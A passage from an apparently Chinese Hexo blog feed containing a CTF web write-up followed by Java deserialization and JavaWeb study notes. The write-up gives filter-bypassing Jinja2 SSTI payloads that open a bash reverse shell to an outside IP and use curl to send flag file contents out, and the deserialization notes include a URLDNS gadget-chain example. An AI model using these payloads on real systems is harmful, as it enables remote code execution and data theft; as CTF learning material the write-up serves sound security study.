        <content type="html"><![CDATA[<p>谢谢出题人，SSTI🦈我，签到就不说了，直接看后面两个</p>        <h2 id="Harddisk"   >          <a href="#Harddisk" class="heading-link"><i class="fas fa-link"></i></a><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2>      <p>SSTI，就是过滤很过分，甚至还滤了g和x这两个单字符，还过滤了<code>&#123;&#123;&#125;&#125;</code>和print，注定是没有回显了，要反弹shell了，先试试构造最简单的<del>（别说为啥不用别的，都被ban了我怎么用😭）</del> <code>lipsum.__globals__[&#39;os&#39;].popen(&#39;sh -i &gt;&amp; /dev/tcp/182.61.46.138/10000 0&gt;&amp;1&#39;).read()</code></p><pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;&quot;__globals__&quot;%&#125;&#123;%set d&#x3D;&quot;os&quot;%&#125;&#123;%set e&#x3D;&quot;popen&quot;%&#125;&#123;%set c&#x3D;&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.61.46.138&#x2F;10000 0&gt;&amp;1&quot;%&#125;&#123;%set f&#x3D;&quot;get&quot;%&#125;&#123;%set b&#x3D;((lipsum|attr(a))|attr(&quot;get&quot;)(d))|attr(e)(c) %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>走一波unicode编码还有空格绕过，就变成了这样</p><pre class="line-numbers language-none"><code class="language-none">&#123;%25set%09a&#x3D;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09d&#x3D;&quot;\u006f\u0073&quot;%25&#125;&#123;%25set%09e&#x3D;&quot;\u0070\u006f\u0070\u0065\u006e&quot;%25&#125;&#123;%25set%09c&#x3D;&quot;\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u002f\u0031\u0030\u0030\u0030\u0030\u0020\u0030\u003e\u0026\u0031&quot;%25&#125;&#123;%25set%09f&#x3D;&quot;\u0067\u0065\u0074&quot;%25&#125;&#123;%25set%09b&#x3D;((lipsum|attr(a))|attr(f)(d))|attr(e)(c)%25&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行出错了，估计是没导os模块，走import的路子吧（不知道为啥shell反弹不过来，就用学长给的curl外带吧</p><pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;&quot;__globals__&quot;%&#125;&#123;%set b&#x3D;&quot;__builtins__&quot;%&#125;&#123;%set cmd&#x3D;&quot;__import__(&quot;os&quot;).system(&quot;curl 182.61.46.138?&#96;cat &#x2F;f*&#96;&quot;)&quot;%&#125;&#123;%set c&#x3D;(lipsum|attr(a))|attr(&quot;get&quot;)(b)|attr(&quot;get&quot;)(&quot;eval&quot;)(cmd)%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同上换一下格式</p><pre class="line-numbers language-none"><code class="language-none">&#123;%25set%09a&#x3D;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09b&#x3D;&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09cmd&#x3D;&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0022\u0063\u0075\u0072\u006c\u0020\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u003f\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0060\u0022\u0029&quot;%25&#125;&#123;%25set%09c&#x3D;(lipsum|attr(a))|attr(&quot;\u0067\u0065\u0074&quot;)(b)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(cmd)%25&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207242303093.png"></p>        <h2 id="绝对防御"   >          <a href="#绝对防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h2>      <p>呜呜呜我是笨比，找到了文件都没想着直接打开一下😭</p><p>扫不出东西就看看JS吧，其中一个文件的API带了php文件<code>ImLib.API_PATH = &quot;/SUPPERAPI.php&quot;;</code>，看一下，有源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[`~!@#$%^&amp;*()_+&lt;>?:"&#123;&#125;,.\/;'[\]]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">im</span></span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"提示：您输入的信息含有非法字符！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化基础</title>
      <link href="/posts/a3c4d7f5.html"/>
      <url>/posts/a3c4d7f5.html</url>
      
        <content type="html"><![CDATA[        <h1 id="Java序列化基础"   >          <a href="#Java序列化基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java序列化基础" class="headerlink" title="Java序列化基础"></a>Java序列化基础</h1>              <h2 id="序列化与反序列化"   >          <a href="#序列化与反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2>      <p>序列化就是将一个对象压缩为字节流的形式，而反序列化就是将字节流转换回内存中的对象</p>        <h3 id="为什么会不安全"   >          <a href="#为什么会不安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#为什么会不安全" class="headerlink" title="为什么会不安全"></a>为什么会不安全</h3>      <ul><li>对于Java来说，反序列化不安全的点，是在于其反序列化时进行了“额外的操作”（重写readObject方法中的内容）</li><li>可能的危险形式</li><li>入口类的readObject直接调用危险方法</li><li>入口类参数中包含可控类，该类有危险方法，readObject时调用</li><li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用，比如在类型为Object时调用对应的equals/hashcode/toString等方法</li><li>构造函数或静态代码块等类加载时隐式执行</li></ul>        <h3 id="一些条件"   >          <a href="#一些条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#一些条件" class="headerlink" title="一些条件"></a>一些条件</h3>      <p>共同条件：实现Serializable接口</p><p>入口类 source（重写readObject，参数类型宽泛，最好JDK自带）</p><p>调用链 gadget chain</p><p>执行类 sink （RCE，SSRF，写文件等）</p>        <h3 id="反射"   >          <a href="#反射" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射" class="headerlink" title="反射"></a>反射</h3>      <p>官方释义：Java的反射机制是指在运行状态中，对于任意一个类都能知道这个类的所有属性和方法，并且对于任意一个对象，都能调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能称为Java的反射机制</p><p><strong>作用</strong></p><ul><li>让Java具有动态性</li><li>修改已有对象的属性</li><li>动态生成对象</li><li>动态调用方法</li><li>操作内部类和私有方法</li></ul><p>一些反射方法</p><ul><li><code>obj.getClass()</code>获取对象类Class对象</li><li><code>cla.getConstructor(参数1类型,参数2类型)</code>获取对象指定形式的构造方法Constructor对象</li><li><code>cst.newInstance(参数1,参数2)</code>通过指定的构造方法新建对一个对应类的对象</li><li><code>cls.getDeclaredFields()</code>获取所有类中声明的变量，返回一个Field数组</li><li><code>cls.getDeclaredField(变量名)</code>通过变量名获得该类变量对象，返回一个Field对象</li><li><code>fld.set(对象,新变量值)</code>给对象设置新变量内容</li><li><code>fld.setAccessible(布尔)</code>给类的变量设置访问属性，true为可访问</li><li><code>cls.getMethods()</code>获取类的所有方法，返回一个Method数组</li><li><code>cls.getMethods(方法名,参数范型)</code>通过方法名获取该类方法，返回一个Method对象</li><li><code>med.invoke(对象,传参)</code></li></ul><p>反射在反序列化中的应用</p><ul><li>定制需要的对象</li><li>通过invoke调用除同名函数之外的函数</li><li>通过Class类创建对象，引入不能序列化的类</li></ul>        <h3 id="代理"   >          <a href="#代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#代理" class="headerlink" title="代理"></a>代理</h3>      <p>为其他对象提供一个代理来访问原对象，比如各种的get和set方法就是一种代理</p><p>静态代理</p><p>动态代理</p><p>需要使用JDK中的Proxy类</p>        <h3 id="Java序列化实例"   >          <a href="#Java序列化实例" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java序列化实例" class="headerlink" title="Java序列化实例"></a>Java序列化实例</h3>      <p>需要实现java.io.Serializable接口（该接口是一个空接口）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Person.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Main.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Jlan"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//序列化过程</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一些注意事项</p><ul><li>序列化针对的是对象而不是类，所以在序列化时静态成员是不会被序列化的</li><li>如果子类实现了Serializable接口而父类没有实现，那么在序列化时父类定义的内容不会被序列化</li><li>如果类中添加了transient关键字，那么该属性不会被序列化</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Main.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"ser.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//需要强制类型转换</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>类中serialVersionUID，如果序列化与反序列化类的serialVersionUID不同会直接抛出异常</li></ul>        <h3 id="一个简单的反序列化链"   >          <a href="#一个简单的反序列化链" class="heading-link"><i class="fas fa-link"></i></a><a href="#一个简单的反序列化链" class="headerlink" title="一个简单的反序列化链"></a>一个简单的反序列化链</h3>      <p><strong>URLDNS</strong></p><ul><li><p>该链由两个类组成，分别是HashMap和URLStreamHandler类</p></li><li><p>HashMap中重载了readObject函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span><span class="token class-name">K</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">K</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>      <span class="token class-name">V</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">V</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处调用了hash函数，那么如果其中有变量重写了hash函数，那么就有可能有漏洞</p></li><li><p>我们发现URLStreamHandler类中的hashCode函数调用了<code>getHostAddress</code>方法，此处对传入参数u进行了DNS查询，此时反序列化链就明显了</p></li><li><p>```<br>HashMap.readObject-&gt;URLStreamHandler.hashCode-&gt;getHostAddress</p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;javapublic class Main &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        String url&#x3D;&quot;http:&#x2F;&#x2F;kcywg9.ceye.io&quot;;        URLStreamHandler handler&#x3D;new SilentURLStreamHandler();        HashMap ht&#x3D;new HashMap();        URL u&#x3D;new URL(null,url,handler);        ht.put(u,url);        ObjectOutputStream objectOutputStream&#x3D;new ObjectOutputStream(new FileOutputStream(&quot;ht.ser&quot;));        objectOutputStream.writeObject(ht);&#x2F;&#x2F;序列化过程        objectOutputStream.close();    &#125;    static class SilentURLStreamHandler extends URLStreamHandler&#123;        SilentURLStreamHandler()&#123;&#125;        protected URLConnection openConnection(URL u) throws IOException&#123;            return null;        &#125;        protected synchronized InetAddress getHostAddress(URL u)&#123;return null;&#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb入门</title>
      <link href="/posts/84f639f6.html"/>
      <url>/posts/84f639f6.html</url>
      
        <content type="html"><![CDATA[        <h1 id="JavaWeb"   >          <a href="#JavaWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1>              <h3 id="JDBC-API"   >          <a href="#JDBC-API" class="heading-link"><i class="fas fa-link"></i></a><a href="#JDBC-API" class="headerlink" title="JDBC API"></a>JDBC API</h3>      <p>快速入门</p><ol><li>创建工程导入驱动jar包</li><li>注册驱动<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</code></li><li>获取链接<code>Connection conn= DriverManager.getConnection(url,username,password);</code></li><li>准备sql语句<code>String sql=&quot;update nnn set id=5 where id=4&quot;;</code></li><li>获取执行sql对象Statement<code>Statement stmt=conn.createStatement();</code></li><li>执行sql并获取返回内容<code>int count=stmt.executeUpdate(sql);</code></li><li>关闭链接<code>stmt.close();conn.close();</code></li></ol>        <h3 id="API详解"   >          <a href="#API详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#API详解" class="headerlink" title="API详解"></a>API详解</h3>              <h5 id="DriverManager"   >          <a href="#DriverManager" class="heading-link"><i class="fas fa-link"></i></a><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h5>      <ul><li>驱动管理类的作用<ul><li>注册驱动</li><li>获取数据库的连接</li></ul></li><li>一些方法（都是静态方法）<ul><li><code>getConnection()</code>尝试建立与给定数据库URL的连接<ul><li>url：jdbc:数据库类型://IP:端口/数据库名称?参数</li></ul></li><li><code>registerDriver()</code>注册给定的驱动程序，上面mysql中的Driver类本质利用的还是这个函数</li></ul></li></ul>        <h5 id="Connection"   >          <a href="#Connection" class="heading-link"><i class="fas fa-link"></i></a><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h5>      <ul><li><p>数据库连接对象的作用</p><ul><li>获取执行SQL的对象</li><li>管理事务</li></ul></li><li><p>一些方法</p><ul><li><p><code>Statement createStatement()</code>普通执行SQL对象</p></li><li><p><code>PreparedStatement preparedStatement(sql)</code>预编译SQL的执行SQL对象，防SQL注入</p><ul><li>首先获取一个PreparedStatement对象，然后SQL语句中的参数值用?代替占位</li><li>进行<code>setxxx(参数1,参数2)</code>来给?赋值</li><li>直接执行无需再次穿参</li></ul></li><li><p>MySQL事务管理</p></li><li><p><code>setAutoCommit(boolen)</code>true为自动提交事务，false为手动提交事务，即为开启事务</p></li><li><p><code>commit()</code>提交事务</p></li><li><p><code>rollback()</code>回滚事务</p></li></ul></li></ul>        <h5 id="Statement"   >          <a href="#Statement" class="heading-link"><i class="fas fa-link"></i></a><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h5>      <ul><li>作用：执行SQL语句</li><li><code>int executeUpdate(sql)</code>执行DML，DDL语句，返回DML语句影响的行数，DDL语句执行后，执行成功也可能返回0</li><li><code>ResultSet executeQuery(sql)</code>执行DQL语句，返回结果集对象</li><li>ResultSet<ul><li><code>next()</code>光标向后移一位并判断是否有内容</li><li><code>gets数据类型(列名或列数)</code>获取当前光标指向的内容</li></ul></li></ul>        <h5 id="数据库连接池"   >          <a href="#数据库连接池" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h5>      <ul><li><p>为了保持数据库连接存在</p></li><li><p>使用过程</p><ol><li><p>导入jar包</p></li><li><p>定义配置文件，示例如下</p><pre class="line-numbers language-none"><code class="language-none">driverClassName&#x3D;com.mysql.jc.jdbc.Driverurl&#x3D;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;db1?characterEncoding&#x3D;utf-8username&#x3D;rootpassword&#x3D;123456initialSize&#x3D;5maxActive&#x3D;10maxWait&#x3D;5000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>导入配置文件<code>Properties prop=new Properties();</code></p><p><code>prop.load(new FileInputStream(&quot;/Users/jlan/IdeaProjects/JavaWeb/jdbc-demo/src/druid.properties&quot;));</code></p></li><li><p>建立连接<code>DataSource dataSource= DruidDataSourceFactory.createDataSource(prop);</code><br><code>Connection connection=dataSource.getConnection();</code></p></li></ol></li></ul>        <h5 id="Maven"   >          <a href="#Maven" class="heading-link"><i class="fas fa-link"></i></a><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h5>      <ul><li><p>Maven是专门用于管理和构建Java项目的攻击，它的主要功能有</p><ul><li><p>提供了一套标准化的项目结构</p><ul><li>maven-project——项目名称<ul><li>src——源代码和测试代码目录<ul><li>main——源代码目录<ul><li>java——源代码Java文件目录</li><li>resources——源代码配置文件目录</li><li>webapp——web项目核心目录</li></ul></li><li>test——测试代码目录<ul><li>java——测试代码Java文件目录</li><li>resources——测试代码配置文件目录</li></ul></li><li>pom.xml——项目核心配置文件</li></ul></li></ul></li></ul></li><li><p>提供了一套标准化的构建流程</p><ul><li>正常构建流程<ul><li>编译，测试，打包，发布</li></ul></li><li>Maven提供一套命令来简单构建</li></ul></li><li><p>提供了一套依赖管理机制</p><ul><li><p>正常导入包流程</p><ul><li>下载jar包</li><li>复制jar包到项目</li><li>导入jar包</li></ul></li><li><p>Maven导入包</p><ul><li><p>更改pom.xml配置文件即可 </p><pre class="line-numbers language-none"><code class="language-none">        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul></li></ul></li><li><p>使用Maven构建的项目结构完全一样，所有IDE创建的Maven项目可以通用</p></li><li><p>Maven的仓库</p><ul><li>本地仓库：本地计算机上的一个目录</li><li>中央仓库：由Maven团队维护的全球唯一的仓库</li><li>远程仓库：一般是由公司搭建的私有仓库</li></ul></li></ul>        <h5 id="MyBatis"   >          <a href="#MyBatis" class="heading-link"><i class="fas fa-link"></i></a><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h5>      <ul><li>是一款持久层（负责将数据保存到数据库的那一层代码）框架，用于简化JDBC开发</li><li>JDBC的缺点：硬编码，操作繁琐</li><li>MyBatis通过配置文件解决了硬编码和操作繁琐的问题，通过预先定义的配置文件来简化连接及处理结果集的工作</li></ul>        <h5 id="Servlet"   >          <a href="#Servlet" class="heading-link"><i class="fas fa-link"></i></a><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5>      <ul><li><p>第一个示例程序</p></li><li><p>```java<br>//MyFirstServlet.java<br>package top.darkflow;<br>import javax.servlet.*;<br>import java.io.IOException;<br>import java.io.PrintWriter;<br>public class MyFirstServlet implements Servlet {</p><pre><code>public void init(ServletConfig config) throws ServletException &#123;    System.out.println(&quot;Init&quot;);&#125;public void service(ServletRequest request, ServletResponse response)        throws ServletException, IOException &#123;    System.out.println(&quot;From service&quot;);    PrintWriter out = response.getWriter();    out.println(&quot;Hello, Java Web.&quot;);&#125;public void destroy() &#123;    System.out.println(&quot;Destroy&quot;);&#125;public String getServletInfo() &#123;    return null;&#125;public ServletConfig getServletConfig() &#123;    return null;&#125;</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- &#96;&#96;&#96;xml  &lt;!--web.xml--&gt;  &lt;?xml version&#x3D;&quot;1.0&quot; 